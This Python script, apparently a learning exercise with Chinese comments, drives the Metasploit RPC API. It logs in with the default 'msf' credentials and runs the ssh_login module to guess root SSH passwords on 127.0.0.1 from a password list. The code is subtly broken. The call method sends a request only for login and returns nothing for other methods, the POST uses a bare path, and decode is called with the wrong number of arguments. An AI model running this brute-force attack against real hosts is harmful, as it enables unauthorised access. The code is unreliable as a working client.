# _*_ encoding:utf-8 _*_

# __author__ = "dr0op"

# python3
import sys

import msgpack

import time

import http.client

import requests

HOST="192.168.31.171"

PORT="65533"

class Msfrpc:

    class MsfError(Exception):


        """

        异常处理函数

        """

        def __init__(self, msg):

            self.msg = msg

        def __str__(self):#可以根据我们的需要返回实例转化成字符串之后的结果。,就是把打印地址的强行打印成字符串，详情https://zhuanlan.zhihu.com/p/130442206

            return repr(self.msg)

    class MsfAuthError(MsfError):

    # """
    #
    # 登录异常处理
    #
    # """

        def __init__(self, msg):

            self.msg = msg

    def __init__(self, opts=[]):

        self.host = HOST

        self.port = PORT

        self.uri = "/api"

        self.ssl = False

        self.authenticated = False

        self.token = False

        self.headers = {"Content-type" : "binary/message-pack"}

        if self.ssl:

            self.cli = http.client.HTTPConnection(self.host,self.port)

        else:

            self.cli = http.client.HTTPConnection(self.host, self.port)

    def encode(self, data):

        """

        序列化数据(编码)

        """

        return msgpack.packb(data)#序列化数据(编码)

    def decode(self, data):

        """

        反序列化数据(解码)

        """

        return msgpack.unpackb(data)

    def call(self, meth, opts = []):

        if meth != "auth.login":

            if not self.authenticated:#已验证

                raise self.MsfAuthError("MsfRPC: Not Authenticated")#主动抛出异常，这是raise的第三种写法

        elif meth == "auth.login":

            opts.insert(0,self.token)

            opts.insert(0,meth)

            params = self.encode(opts)

            # 发送请求包

            res = requests.post(self.uri, params,self.headers)#这里没用上

            resp = self.cli.getresponse()

            # 获取结果并解码


            return self.decode(res,resp.read())

    def login(self, user, password):

        """

        登录认证函数

        """

        ret = self.call('auth.login', [user,password])

        if ret.get('result') == 'success':

            self.authenticated = True

            self.token = ret.get('token')

            return True

        else:

            raise self.MsfAuthError("MsfRPC: Authentication failed")

if __name__ == '__main__':

    # 创建一个新的默认配置的客户端实例

    client = Msfrpc({})

    # 使用密码abc123登录msf

    client.login('msf','msf')#账号密码

    try:

        res = client.call('console.create')

        console_id = res['id']

    except:

        print ("Console create failed\r\n")

        sys.exit()

    # 要发送给终端的命令

    cmd = """
    
    use auxiliary/scanner/ssh/ssh_login
    
    set RHOSTS 127.0.0.1
    
    set USERNAME root
    
    set PASS_FILE /tmp/pass.txt
    
    exploit
    
    """

    client.call('console.write',[console_id,cmd])#console.write方法将数据发送到创建的终端，就想平时操作msfconsole那样，但需要给不同的命令后加上换行。

    time.sleep(1)

    while True:

    # 发送命令并获取结果

        res = client.call('console.read',[console_id])#console.read方法将返回发送到终端命令的执行结果。

        if len(res['data']) > 1:#将字节流打印

            print (res['data'])

        if res['busy'] == True:
            time.sleep(1)
            continue
        break

    client.call('console.destroy',[console_id])